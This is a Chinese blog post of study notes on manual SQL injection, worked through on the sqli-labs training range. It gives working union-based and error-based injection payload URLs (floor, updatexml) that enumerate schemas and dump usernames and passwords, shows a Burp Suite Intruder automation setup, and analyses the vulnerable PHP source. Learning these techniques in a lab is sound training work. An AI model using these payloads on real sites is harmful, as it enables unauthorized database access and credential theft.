---  
layout: post
title: SQL注入学习笔记1
lastUpdate: 2020-08-04
author: 404player
header-img: post-bg-sql-a.jpg
catalog: true 	
tags: [SQL注入]
---    

最近学习了一下有关`SQL`手工注入的相关知识，趁着有空赶紧整理一下。  
  
本文所有的测试都是基于`sqli-labs`环境进行的，`sqli-labs`集成了各种情况的`SQL`注入漏洞，是学习`SQL`注入最经典的靶场。开源地址：`https://github.com/Audi-1/sqli-labs`  。
  
另外，为了更方便地进行`payload`的编写，最好在`谷歌浏览器`中装一个`Hackbar`。  
  
为了实现自动化的信息获取，借助渗透神器`Burpsuite`也是必不可少的操作。  
  
- - - 


## SQL手工注入方法  
  
在讲述`SQL`手工注入方法之前，我们要对`SQL`数据库有一个基本的了解。  
    
`MySQL`数据库一共有四个内置库，以下说明一下这四个内置库分别有什么作用：  
  
- mysql  
    含有账户信息、权限信息、存储过程、时区等信息  
      
- sys  
    包含一系列的存储过程、自定义函数以及视图帮助了解系统元数据的信息  
      
- performance_schema  
    用来收集数据库服务器性能参数  
      
- information_schema  
    提供访问数据库元数据的方式，保存着Mysql服务器所维护其他数据库的信息  
      
    
      
这里我们可以很明显地看到，对于`SQL`注入来说，`information_schema`无疑是最重要的一个内置库。因为这个库存储着`Mysql`中所有数据库的信息，也就是只要想办法访问到`information_schema`这个数据库，就可以访问到权限范围内所有数据库文件的信息，甚至可以进行数据库文件的读写操作。  
  
### 查询数据库核心语法  
  
了解到`information_schema`数据库的作用以后，我们首先从数据库语法的角度看看怎么在数据库中进行信息的查询。  
  
```MySQL
# 查询MySQL中所有的数据库  
  
select schema_name from information_schema.schemata  
  
# 查询某数据库中所有表名  
  
select table_name from information_schema.tables where table_schema=库名  
  
# 查询某数据表内所有的列名  
  
select column_name from information_schema.columns where table_name=表名  
  
# 查询具体数据  
  
select 列名 from 库名.表名  

```  
  
以上只是我在`Mysql`语法的角度说明一下查数据的语句。  
  
下面要介绍的是一些注入过程中要注意的点：  
  
1. 在写`库名`,`表名`,`列名`的时候，可以将字符串转换为`16进制`，输出结果是一样的  
  
2. 因为数据库输出数据是有长度和行数限制的，所以要获取批量的数据，就要善用数据库的函数和语法,如`limit`，`concat`，`group_concat`，`concat_ws`等等。 这些的具体用法都会在后续的介绍中讲到。  
  
3. 在一些场景中，想要快速获取数据，需要借助工具，比如`Burpsuite`  
  
 - - -    
       
## Union 查询注入  
  
`union`语句是在`SQL`注入中最常用到的语句之一。而`union`查询注入算是`SQL`注入中最简单的注入了。  
  
`union`语句用于合并两个或多个`select`语句的结果集。举个例子，假如有两个拥有列数相同的表`user1`和`user2`,你想要查询其中的数据并一起显示出来，查询语句就是`select * from user1 union select * from user2`。  
    
`union`要求`select`语句必须拥有相同数量的列，列必须拥有相似的数据类型，且每条语句列顺序必须相同。而且`union`是允许重复的，简单来说，就是遇到两行一模一样的数据，也是会正常输出。如果要避免重复数据出现，需要使用`union all`。  
  
### a. union注入前提  
  
- union链接的几个查询的字段数一样且列的数据类型相似  
  
- 注入点页面有回显  
  
### b. union注入步骤  
  
- 使用`order by`语句先确定列数    
    `order by`语句是一个排序的语句，后面跟字段时就是根据这个字段来进行排序，后面跟数字时就是根据第几列进行判断，所以当后面跟的数字超出数据列的范围时，会进行报错，从而推断出数据的列数  

- 观察页面的回显，选取可以显示数据的位置，进行下一步的注入  
  
- 依次读取库的信息，表的信息，读取字段最终读取数据    
  
### c. 靶场演示  
  
本次演示的靶场环境是`sqli-labs`的第一关。界面如下：  
  
<img src="https://img-blog.csdnimg.cn/20200804215338472.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dlZWtib3lfMTIz,size_16,color_FFFFFF,t_70">  
  
打开`Hackbar`,开始在`URL`上进行`Payload`的编写  
  
首先是要测试一下页面是否存在`SQL`注入漏洞  
  
```mysql
http://127.0.0.1/sqli-labs-master/Less-1/?id=1  # 正常显示数据  
  
http://127.0.0.1/sqli-labs-master/Less-1/?id=1' # 报错  
  
http://127.0.0.1/sqli-labs-master/Less-1/?id=1' and '1' = '1  # 正常显示数据  
  
http://127.0.0.1/sqli-labs-master/Less-1/?id=1' and '1' = '2  # 不显示数据
```  
  
经过以上测试，可以确定页面的确存在`SQL`注入漏洞  
  
接下来就是要通过`order by`函数来确认数据的列数。  
  
```mysql  
http://127.0.0.1/sqli-labs-master/Less-1/?id=1'  order by 3--+
```  
  
在上面的测试语句中，`--+`是注释语句，将后面的引号注释掉，使得页面不会进行报错。另外，对列数的试探也是有技巧的，如果一个一个数往上递增，碰到列数很多的数据，花费的时间和精力是无可估量的。算法上我们也学过二分法，我们可以按照这种思路去试。举个例子，我们可以先假设一个列数12，当`order by 12`报错的时候，证明实际列数比12小，这个时候我们可以试6，显而易见6也会报错，以此类推便试3，3没有报错，可以得出列数为`3-5`之间，于是试4，4报错，所以正确的列数是3。    
  
列数知道之后，我们要使用`select`语句去查看页面的回显  
  
```mysql  
http://127.0.0.1/sqli-labs-master/Less-1/?id=' union select 1,2,3--+  
```  
  
`select 1,2,3`就是构造出跟原数据列数相同的一行，而且此时id值设为空的目的是让`union`前面的语句不回显，这样就是看到`1,2,3`这三个数字究竟在页面中哪个位置显示，在进行进一步的操作时，只要将具体的语句替换掉数字，就可以进行完整的`SQL`注入了。    
  
我们来看看页面的回显  
  
<img src="https://img-blog.csdnimg.cn/20200805113228926.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dlZWtib3lfMTIz,size_16,color_FFFFFF,t_70">  
  
这里我们可以看出，`2`和`3`显示在了页面上，所以接下来的注入语句就可以在`2`和`3`处替换  
  
还记的我们刚刚提到的查询数据库的核心语法吗？只要将这些语句替换到你想要显示的位置就可以完成一次`SQL`注入，还有一个值得注意的点是，因为数据库对回显有限制，所以在必要时要善用`group_concat`等语法完成一次性的回显。  
  
我们还是按照读取数据库的一般步骤一步步来，先读取一下`MySQL`中所有数据库名：  
  
```mysql  
http://127.0.0.1/sqli-labs-master/Less-1/?id=' union select 1,2,(select group_concat(schema_name) from information_schema.schemata)--+
```    
  
回显页面如下：  

<img src="https://img-blog.csdnimg.cn/20200805114546979.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dlZWtib3lfMTIz,size_16,color_FFFFFF,t_70">  
  
可见原本显示`3`的地方显示出了所有`Mysql`的数据库名  
  

以此类推，还可以进行表的读取，列的读取，最后再精细到数据表中数据的读取  
  
```
# 读取表,database()指的是当前数据库
  
http://127.0.0.1/sqli-labs-master/Less-1/?id=' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database())--+  
  
# 列的读取，就以读取users数据表为例  
  
http://127.0.0.1/sqli-labs-master/Less-1/?id=' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='users')--+  
  
# 数据的读取，读取users表中password和username两个字段  
  
http://127.0.0.1/sqli-labs-master/Less-1/?id=' union select 1,2,(select concat(username,0x7e,password) from users limit 1,1)--+  
  
# 可以利用limit一行一行进行读取
```  
  
### d.源码解读  
  
本次`union`查询注入基本上是完成了，下面我们在源码层面分析一下为什么会出现这种注入  
  
先来看一眼源码  
  
```php
<?php
//including the Mysql connect parameters.
include("../sql-connections/sql-connect.php");
error_reporting(0);
// take the variables 
if(isset($_GET['id']))
{
$id=$_GET['id'];
//logging the connection parameters to a file for analysis.
$fp=fopen('result.txt','a');
fwrite($fp,'ID:'.$id."\n");
fclose($fp);

// connectivity 


$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";

```  
  
以上是靶场环境源码的节选，我们可以很清楚地看出来，这只是一个很简单的逻辑。  
  
就是用户传递一个参数上去，通过`GET`方法获取这个参数以后，直接传递到`sql`变量中作为语句处理，这样的参数完全不经过处理直接传递的代码逻辑造成了`union`查询注入漏洞的形成。    
  
- - -   
  
## 报错注入  
  
下面我们来研究另外一种经典的`SQL`注入。  
  
这种注入叫做报错注入，应用场景就是查询的信息在页面中不会进行内容的回显，但是会打印错误的信息。  
  
因为不进行内容的回显，我们没办法像`union`查询注入一样，让查询的内容在页面回显中显示出来，我们只能想办法让错误信息中显示数据库的内容了。  
  
### a. 常用函数介绍  
  
在正式介绍报错注入方法之前，我们首先来熟悉一下报错注入中常用到的几个函数。  
  
```  
floor()  
  
# 作用是返回小于或等于x的最大整数，在报错注入中常常与rand函数相互搭配使用  
  
extractvalue（）  
  
# 作用是在目标的XML中返回包含所查询值的字符串  
  
# 需要传入两个参数，第一个参数是XML形式的字符串，第二个参数是xpath形式的字符串  
  
# 在实际应用中，只要将第二个参数换成查询语句，数据库就会因不是xpath格式的字符串而报错，从而将信息打印出来  
  
updatexml  
  
# 作用与extractvalue（）差不多，只是前者作用是匹配，后者是匹配后进行替换  
  
# 传入三个参数，除去前面所说到两个参数外，多一个参数用于替换匹配到的字符  
  
# 注入原理与extractvalue（）并无差别
```  
  
### b. 注入方法  
  
1. floor()注入语句  
  
```  
http://127.0.0.1/sqli-labs-master/Less-1/?id=1' and (select count(*) from information_schema.tables group by concat((select version()),floor(rand(0)*2)))--+ 
```    
  
```
http://192.168.3.6/sqli-labs-master/Less-5/?id=1' and (select count(*) from information_schema.tables group by concat (0x7e,(select concat(username,0x7e,password) from users limit 11,1),0x7e,floor(rand(0)*2)))--+
```
  
2. updatexml()注入语句  

```  
http://127.0.0.1/sqli-labs-master/Less-1/?id=1' and (select updatexml(1,concat(0x7e,(select user()),0x7e),1))--+  
``` 
    
注意：之所以在`updatexml`中替换查询语句还要用`concat`有两点原因，第一点，遇上管理员用户`root@localhost`时，`root`也会被当成`xpath`格式的字符串而不被打印到报错信息中，显示的只有`@localhost`。第二点，碰上自己写脚本去获取数据时，前后加上`~`（也就是0x7e）,更容易进行正则匹配，取得准确的数据。  
  
### c. 使用Burpsuite进行自动化信息获取  
    
报错注入对打印出来的信息有长度限制，一般只能显示32位数据。  
  
经常使用limit语句一个个查看数据库信息也会浪费大量的时间和精力，这时候就要借助渗透神器`Burpsuite`的`repeater`和`intruder`模块来实现数据的自动化获取。  
  
我们先梳理一遍步骤，首先设置浏览器和`Burpsuite`代理，使得`Burpsuite`得以顺利得抓取浏览器的数据包。  
  
<img src="https://img-blog.csdnimg.cn/20200805163945476.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dlZWtib3lfMTIz,size_16,color_FFFFFF,t_70">  
  
下一步，我们首先要先进行一次手工注入，然后在`Burpsuite`中抓取到相应的数据包，并把数据包发送到`repeater`的相应模块中。  
    
确认页面能正常得到响应以后，将数据报发送到`intruder`模块中。  
  
<img src="https://img-blog.csdnimg.cn/20200805164036732.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dlZWtib3lfMTIz,size_16,color_FFFFFF,t_70">  
  
然后将`limit`后的数字设置为变化的参数，并在`Payloads`中设置参数的特性。  
  
<img src="https://img-blog.csdnimg.cn/20200805164107839.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dlZWtib3lfMTIz,size_16,color_FFFFFF,t_70" width="400px" height="500px">  
  
最终要在`Options`设置中的`Grep - Extract`部分匹配到相应包的回显部分。  
  
<img src="https://img-blog.csdnimg.cn/20200805164144348.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dlZWtib3lfMTIz,size_16,color_FFFFFF,t_70">  
  
所有东西都设置好以后，点击`Start attack`启动，就可以得到数据了。  
  
<img src="https://img-blog.csdnimg.cn/20200805165703573.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dlZWtib3lfMTIz,size_16,color_FFFFFF,t_70">    
  
### d. 源码分析  
  
本次测试的靶场环境是`sqli-labs`的第五关，我们来看看源码。  
  
```php  
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

	if($row)
	{
  	echo '<font size="5" color="#FFFF00">';	
  	echo 'You are in...........';
  	echo "<br>";
    	echo "</font>";
  	}
	else 
	{
	
	echo '<font size="3" color="#FFFF00">';
	print_r(mysql_error());
	echo "</br></font>";	
	echo '<font color= "#0000ff" font size= 3>';	
	
	}
}
	else { echo "Please input the ID as parameter with numeric value";}
```  
  
我们可以看到代码中并没有进行内容的回显，都是用`You are in`来代替。  
  
而最后在传入参数有问题的时候，就会`print_r(mysql_error())`。这个就是报错注入形成的原因，页面会回显报错信息。  
  
在代码审计的过程中如果遇到这种情况，基本可以判断存在报错注入。
  
    
## 总结  
  
以上介绍的两种`SQL`注入只是回显注入的两种经典的例子，关于`SQL`注入，还有很多其他的更有难度的情况，出于篇幅限制就先写到这里。  
  
如有写得不对或者不清楚的地方，欢迎大家多多指正。
















